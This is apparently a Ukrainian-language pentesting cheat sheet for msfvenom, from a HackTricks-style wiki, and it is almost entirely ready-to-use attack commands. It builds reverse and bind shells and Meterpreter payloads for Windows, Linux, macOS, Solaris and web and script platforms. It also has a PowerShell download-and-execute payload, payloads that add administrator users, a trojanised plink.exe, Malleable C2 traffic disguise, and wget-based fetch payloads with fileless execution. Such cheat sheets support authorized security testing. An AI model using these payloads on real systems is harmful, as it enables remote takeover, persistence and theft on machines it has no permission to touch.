# MSFVenom - Шпаргалка

{{#include ../../banners/hacktricks-training.md}}

---

## Основи msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Використовуйте `-a`, щоб вибрати архітектуру payload, а `--platform` — щоб вибрати цільову платформу.<sup>[[1]](#references)</sup>

## Перелік
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Ці команди перелічують доступні в установленому framework модулі payload і encoder.<sup>[[1]](#references)</sup>

## Поширені параметри під час створення shellcode
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Прапорці, показані тут, вибирають погані символи, формат виводу, encoder і кількість ітерацій кодування.<sup>[[1]](#references)</sup>

## Формування HTTP(S)-трафіку Meterpreter

Metasploit 6.5 додав опцію `MALLEABLEC2` до staged і stageless reverse HTTP(S) Meterpreter payloads. Профіль може змінювати URI, user agents, заголовки запитів/відповідей, розміщення connection ID і підтримувані кодування/обгортки body. І згенерований payload, і його handler повинні завантажувати **той самий локальний profile**. Початковий запит staged payload для Meterpreter stage не маскується, тому використовуйте stageless payload, наприклад `windows/x64/meterpreter_reverse_https`, якщо перший запит також має відповідати profile.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Налаштуйте відповідний handler з ідентичними payload і профілем:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Лише директиви, задокументовані як реалізовані, впливають на трафік; непідтримувані блоки профілю можуть успішно аналізуватися, але не мати жодного ефекту.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Створення користувача
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Виконання команди**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Кодування не є обходом AV:** encoder-и на кшталт `x86/shikata_ga_nai` переважно використовуються для дотримання обмежень щодо заборонених символів. Повторне кодування не є надійним методом обходу AV.<sup>[[1]](#references)</sup>

### Вбудований у виконуваний файл
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Payloads для Linux

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Payloads на основі Web**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Payloads мов скриптів**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads створюють команду, яка змушує доступну утиліту цільової системи завантажити та виконати базовий native payload. Їхні назви мають формат `cmd/<platform>/<fetch-protocol>/<served-payload>`; доступні HTTP(S), SMB і TFTP adapters, а вибір downloader залежить від цільової платформи.<sup>[[2]](#references)</sup>

Наприклад, згенерувати команду `wget` для Linux, яка отримує x64 Meterpreter payload через порт 8080 і встановлює зворотне з’єднання через порт 4444:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Запустіть **fetch handler** з тими самими налаштуваннями; він розміщує згенерований ELF, а також запускає handler для Meterpreter payload, що обслуговується:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Корисні залежні опції включають `FETCH_PIPE=true`, щоб створити коротшу HTTP(S)-команду, де це підтримується, і `FETCH_FILELESS=shell`, `shell-search` або `python3.8+` для виконання Linux ELF з анонімного файлового дескриптора. Безфайлові режими потребують Linux kernel версії 3.17 або новішої; перевірте точний адаптер за допомогою `msfvenom -p <FETCH_PAYLOAD> --list-options>`, оскільки підтримувані комбінації відрізняються.<sup>[[2]](#references)</sup>



## References

- [1] [Як використовувати msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Як використовувати Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Профілі Malleable C2](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
